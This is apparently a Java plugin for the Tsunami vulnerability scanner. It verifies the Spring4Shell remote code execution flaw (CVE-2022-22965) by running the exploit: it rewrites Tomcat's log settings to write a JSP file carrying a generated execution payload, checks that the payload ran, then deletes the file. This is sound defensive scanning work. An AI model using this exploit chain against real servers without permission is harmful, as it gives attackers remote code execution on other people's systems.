/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.spring4shell;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.plugins.detectors.spring4shell.Annotations.DelayBetweenRequests;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.ImmutableMap;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpMethod;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.CrawlResult;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import okhttp3.HttpUrl;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Spring Framework RCE(CVE-2022-22965) */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SpringCve202222965Detector",
    version = "0.1",
    description = "This detector checks for Spring Framework RCE(CVE-2022-22965).",
    author = "C4o (syttcasd@gmail.com)",
    bootstrapModule = SpringCve202222965DetectorBootstrapModule.class)
public final class SpringCve202222965Detector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String PRELIMINARY_CHECK_PARAM =
      "class.module.classLoader.DefaultAssertionStatus";
  // This JSP payload auto-deletes itself if you open it with "?delete=1"
  private static final String JSP_CONTENT_TEMPLATE =
          "<%@ page import=\"java.io.File\" %>\n{{PAYLOAD}}\n<% if(\"1\".equals(request.getParameter(\"delete\"))){ File thisFile=new File(application.getRealPath(request.getServletPath())); thisFile.delete(); out.println(\"Deleted\"); } %>//";

  private static final String LOG_PATTERN_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.pattern";
  private static final String LOG_FILE_SUFFIX_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.suffix";
  private static final String LOG_FILE_PREFIX_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.prefix";
  private static final String LOG_DIRECTORY_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.directory";
  private static final String LOG_FILE_DATE_FORMAT_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat";

  @VisibleForTesting
  public static final String JSP_FILENAME_PREFIX = "Tsunami_";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int delayBetweenRequests;
  private final String fileDateFormat;
  private final String jspFileName;

  @Inject
  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator, @DelayBetweenRequests int delayBetweenRequests) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.delayBetweenRequests = delayBetweenRequests;
    // It's important that fileDateFormat is always different to be able to trigger the exploit more than once.
    this.fileDateFormat = String.valueOf(utcClock.millis());
    this.jspFileName = JSP_FILENAME_PREFIX + fileDateFormat + ".jsp";
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE_2022_22965"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2022-22965"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("Spring Framework RCE CVE-2022-22965")
            .setDescription(
                "A Spring MVC or Spring WebFlux application running on JDK"
                    + " 9+ may be vulnerable to remote code execution (RCE) via data "
                    + "binding. The specific exploit requires the application to run "
                    + "on Tomcat as a WAR deployment. If the application is deployed "
                    + "as a Spring Boot executable jar, i.e. the default, it is not "
                    + "vulnerable to the exploit. However, the nature of the "
                    + "vulnerability is more general, and there may be other ways to "
                    + "exploit it.")
            .setRecommendation(
                "Users of affected versions should apply the following mitigation: "
                    + "5.3.x users should upgrade to 5.3.18+, 5.2.x users should "
                    + "upgrade to 5.2.20+.")
            .build());
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    // Check root URL
    if (check(
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService), HttpMethod.GET, networkService)) {
      return true;
    }

    // Check crawled pages
    for (CrawlResult crawlResult :
        networkService.getServiceContext().getWebServiceContext().getCrawlResultsList()) {
      String targetUri = crawlResult.getCrawlTarget().getUrl();
      HttpMethod httpMethod = HttpMethod.valueOf(crawlResult.getCrawlTarget().getHttpMethod());
      if (check(targetUri, httpMethod, networkService)) {
        return true;
      }
    }
    return false;
  }

  private boolean check(String targetUri, HttpMethod httpMethod, NetworkService networkService) {
    if (!preliminaryCheck(targetUri, httpMethod, networkService)) {
      return false;
    }

    logger.atInfo().log("Preliminary check returned positive for %s", targetUri);
    return exploit(targetUri, httpMethod, networkService);
  }

  private boolean preliminaryCheck(
      String targetUri, HttpMethod httpMethod, NetworkService networkService) {
    /*
    This method will try a preliminary detection method without running the full exploit.
    Since DefaultAssertionStatus is a boolean, setting it to 1 should not return any error,
    but trying to set it to 2 should return a BAD REQUEST error.
     */
    try {
      HttpRequest request = HttpRequest.builder()
              .setMethod(httpMethod)
              .setUrl(targetUri + "?" + PRELIMINARY_CHECK_PARAM + "=1")
              .withEmptyHeaders()
              .build();

      if (httpClient.send(request, networkService).status() != HttpStatus.OK) {
        return false;
      }

      request = HttpRequest.builder()
              .setMethod(httpMethod)
              .setUrl(targetUri + "?" + PRELIMINARY_CHECK_PARAM + "=2")
              .withEmptyHeaders()
              .build();

      if (httpClient.send(request, networkService).status() == HttpStatus.BAD_REQUEST) {
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private static String buildQueryString(Map<String, String> parameters) {
    List<String> params = new ArrayList<>(parameters.size());
    for (Map.Entry<String, String> entry : parameters.entrySet()) {
      params.add(String.format("%s=%s", entry.getKey(), URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8)));
    }
    return String.join("&", params);
  }


  private boolean exploit(String targetUri, HttpMethod httpMethod, NetworkService networkService) {
    // Generate JSP content
    PayloadGeneratorConfig payloadGeneratorConfig = PayloadGeneratorConfig.newBuilder()
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .setInterpretationEnvironment(PayloadGeneratorConfig.InterpretationEnvironment.JSP)
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .build();

    Payload payload = this.payloadGenerator.generate(payloadGeneratorConfig);

    return uploadJsp(targetUri, httpMethod, networkService, payload) && checkUploadedJsp(targetUri, networkService, payload);
  }

  private boolean uploadJsp(String targetUri, HttpMethod httpMethod, NetworkService networkService, Payload payload) {
    /*
     From https://github.com/lunasec-io/Spring4Shell-POC/blob/master/exploit.py
     The exploit involves modifying the logs configuration to write a JSP file in
     Tomcat's root directory. The file is written on the request AFTER the one setting
     the configuration.
     */

    HttpHeaders httpHeaders = HttpHeaders.builder().addHeader("Connection", "close").build();

    try {
      // Generate JSP content
      logger.atInfo().log("Changing the log configuration to write the JSP file.");
      String jspContent = JSP_CONTENT_TEMPLATE
              .replace("{{PAYLOAD}}", payload.getPayload())
              .replace("%", "%{perc}i")
              .replace("Runtime", "%{rt}i");

      Map<String, String> exploitParams = ImmutableMap.of(
              LOG_DIRECTORY_PARAM, "webapps/ROOT",
              LOG_FILE_PREFIX_PARAM, JSP_FILENAME_PREFIX,
              LOG_FILE_DATE_FORMAT_PARAM, this.fileDateFormat,
              LOG_FILE_SUFFIX_PARAM, ".jsp",
              LOG_PATTERN_PARAM, jspContent
      );

      // Modifying logs configuration
      httpClient.send(
              HttpRequest.builder()
                      .setMethod(httpMethod)
                      .setUrl(targetUri + "?" + buildQueryString(exploitParams))
                      .setHeaders(httpHeaders)
                      .build(),
              networkService
      );

      // Wait for changes to propagate
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(delayBetweenRequests));

      // Send an arbitrary request to trigger the file writing
      // The headers are needed to generate the content correctly
      logger.atInfo().log("Triggering JSP file write.");
      HttpHeaders headers = HttpHeaders.builder()
                      .addHeader("perc", "%")
                      .addHeader("rt", "Runtime")
                      .addHeader("Connection", "close")
                      .build();
      httpClient.send(
              HttpRequest.builder()
                      .setMethod(HttpMethod.GET)
                      .setUrl(targetUri)
                      .setHeaders(headers)
                      .build(),
              networkService
      );

      // Wait for file to be written
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(delayBetweenRequests));

      // Set the log file to /dev/null to prevent further data being written to the file
      // or accidentally leaving leftovers on the target
      Map<String, String> resetParams = ImmutableMap.of(
              LOG_DIRECTORY_PARAM, "/dev",
              LOG_FILE_PREFIX_PARAM, "null",
              LOG_FILE_DATE_FORMAT_PARAM, "",
              LOG_FILE_SUFFIX_PARAM, "",
              LOG_PATTERN_PARAM, ""
      );
      logger.atInfo().log("Resetting log configuration.");
      httpClient.send(
              HttpRequest.builder()
                      .setMethod(httpMethod)
                      .setUrl(targetUri + "?" + buildQueryString(resetParams))
                      .setHeaders(httpHeaders)
                      .build(),
              networkService
      );

    } catch (IOException e) {
      return false;
    }
    return true;
  }

  private boolean checkUploadedJsp(String targetUri, NetworkService networkService, Payload payload) {
    List<String> urlsToCheck = new ArrayList<>();
    String tempUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    urlsToCheck.add(tempUrl + this.jspFileName);

    // The JSP file may be in any subpath from our original target URI
    List<String> pathSegments = Objects.requireNonNull(HttpUrl.parse(targetUri)).pathSegments();
    if (pathSegments.size() > 1) {
      for(String segment: pathSegments) {
        tempUrl += segment + "/";
        urlsToCheck.add(tempUrl + this.jspFileName);
      }
    }

    HttpHeaders httpHeaders = HttpHeaders.builder().addHeader("Connection", "close").build();
    for (String url : urlsToCheck) {
      try {
        HttpResponse response;
        int max_attempts = 5;
        int attempt = 0;
        boolean executed;
        // If we get a 200, retry the request a few times as sometimes the contents haven't been written yet
        do {
          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(delayBetweenRequests));
          response = httpClient.send(
                  get(url)
                          .setHeaders(httpHeaders)
                          .build(),
                  networkService
          );
          executed = payload.checkIfExecuted(response.bodyString().orElse(""));
        } while (
                response.status() == HttpStatus.OK
                        && !executed
                        && attempt++ < max_attempts
        );


        if (executed) {
          logger.atInfo().log("Vulnerability confirmed via JSP file uploaded at %s", url);

          // Cleanup
          logger.atInfo().log("Triggering JSP file deletion.");
          httpClient.send(
                  get(url + "?delete=1")
                          .setHeaders(httpHeaders)
                          .build(),
                  networkService
          );

          return true;
        }
      } catch (IOException e) {
        logger.atWarning().withCause(e).log("Unable to query '%s'.", url);
      }
    }
    logger.atWarning().log("Could not find any uploaded JSP file. Target is probably not vulnerable.");
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
